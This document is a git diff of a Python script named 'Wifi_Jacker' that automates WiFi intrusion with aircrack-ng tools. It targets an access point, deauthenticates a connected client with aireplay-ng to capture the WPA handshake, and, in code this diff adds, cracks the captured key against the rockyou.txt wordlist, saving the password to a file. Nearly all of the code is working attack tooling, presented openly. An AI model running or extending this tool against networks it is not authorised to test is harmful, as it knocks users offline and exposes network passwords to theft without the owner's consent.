@@ -1,4 +1,4 @@
-import os, sys, re, datetime
+import os, sys, re, time
 
 '''
    README:
@@ -30,16 +30,19 @@ import os, sys, re, datetime
 
     TROUBLESHOOTING:
 
-        this program assumes your USB wireless and minotor interfaces
-        are named "wlan0" and "wlan0mon" respectively. change these accordingly.
+        *this program assumes your USB wireless and minotor interfaces
+            are named "wlan0" and "wlan0mon" respectively. change these accordingly.
+
+        *if it messes up half way through, you probably need to manually put your usb
+            wifi interface back into managed mode with 'sudo airmon-ng stop <name of monitor interface>'
 '''
 
 
 print(
-    "       __      _              _         _                  __   _\n" +
-    "       \ \    / (_) __(_)  _ | |__ _ __| |_____ _ _  __ __/  \ / |\n" +
-    "        \ \/\/ /| | _|| | | || / _` / _| / / -_) '_| \ V / () || |\n" +
-    "         \_/\_/ |_|_| |_|  \__/\__,_\__|_\_\___|_|    \_/ \__(_)_|\n\n\n")
+    "       *__      _ _     _      _         _                  __   __*\n" +
+    "       *\ \    / (_) __(_)  _ | |__ _ __| |_____ _ _  __ __/  \ / |*\n" +
+    "        *\ \/\/ /| | _|| | | || / _` / _| / / -_) '_| \ V / () || |*\n" +
+    "         *\_/\_/ |_|_| |_|  \__/\__,_\__|_\_\___|_|    \_/ \__(*)_|*\n\n\n")
 
 class Wifi_Jacker:
 
@@ -48,6 +51,8 @@ class Wifi_Jacker:
         self.usb_int = "wlan0"
         self.mon_int = "wlan0mon"
         self.ap_MAC = None
+        self.client = None
+        self.wordlist = "rockyou.txt"
         self.welcome()
 
 
@@ -84,9 +89,17 @@ class Wifi_Jacker:
         elif resp == 3:
             self.check_bssid()
         elif resp == 4:
-            self.c_reconnect()
+            if self.ap_MAC is not None:
+                self.c_reconnect()
+            else:
+                print("please search for a target AP via option #3 first")
+                self.welcome()
         elif resp == 5:
-            self.crack()
+            if self.ap_MAC is not None:
+                self.crack()
+            else:
+                print("please search for a target AP via option #3 first\nalso, make sure you have a captured WPA key before doing this...")
+                self.welcome()
         elif resp == 6:
             if self.mon_mode:
                 self.monmode_config(-1)
@@ -121,6 +134,7 @@ class Wifi_Jacker:
             pid = os.fork()
             if pid > 0:
                 os.system("sudo xterm -e airodump-ng " + self.mon_int)
+                os.wait()
             self.welcome()
         except OSError:
             pass
@@ -132,6 +146,7 @@ class Wifi_Jacker:
             if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", bssid.lower()):
                 picd = False
                 chan = self.check_chan(True)
+                self.ap_MAC = bssid
                 self.hone(bssid, chan)
             else:
                 print("invalid MAC")
@@ -144,18 +159,16 @@ class Wifi_Jacker:
             if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", bssid.lower()):
                 picd = False
                 bssid = bssid.replace(":", "-")
+                self.client = bssid
                 deez = self.check_chan(False)
-                try:
-                    pid = os.fork()
-                    if pid > 0:
-                        os.system("sudo xterm -e aireplay-ng -0" + str(deez) + "-a "
-                                  + str(bssid)
-                                  + "-c " + str(self.ap_MAC) + " " + self.mon_int)
-                except OSError:
-                    print("something went wrong here.")
-                    pass
+                pid = os.fork()
+                if pid > 0:
+                    os.system("sudo xterm -e aireplay-ng -0 " + str(deez) + " -a "
+                                + str(self.ap_MAC)
+                                + " -c " + str(self.client) + " " + self.mon_int)
+                    os.wait()
                 print("*** IMPORTANT ***\n" \
-                      "You now need to wait until you see 'WPA: <AP MAC>\n' "
+                      "You now need to wait until you see 'WPA: <AP MAC>' \n"
                       "in the top right had corner of your honed-in airodump-ng screen,\n"
                       "this signifies that the 4-way handshake has been caught\n."
                       "If this doesn't happen within a reasonable timeframe, you:\n "
@@ -192,14 +205,30 @@ class Wifi_Jacker:
                           + str(chan) +
                           " --bssid " + str(bssid) +
                           " -w ./ " + self.mon_int)
+                os.wait()
             self.welcome()
         except OSError:
             print("something went wrong here. check your interface(s)")
             pass
 
     def crack(self):
-        pass
-        self.welcome()
+        #assumes there is only one .cap file, but w/e
+        k_type = input("what are we working with here? WEP, or WPA-PSK?")
+        k_type = "1" if k_type == "WEP" else "2"
+        try:
+            pid = os.fork()
+            if pid > 0:
+                os.system("sudo aircrack-ng -a" + k_type + " -b " + self.ap_MAC +
+                          " -w ./" + self.wordlist + " ./-01.cap > pword.txt")
+                os.wait()
+            print("cracking...")
+            time.sleep(5)
+            print("check 'pword.txt' for your password! no guarantees")
+            self.welcome()
+        except OSError as ose:
+            print("something went wrong here:\n", ose)
+            pass
 
 if __name__ == "__main__":
     wj = Wifi_Jacker()
+
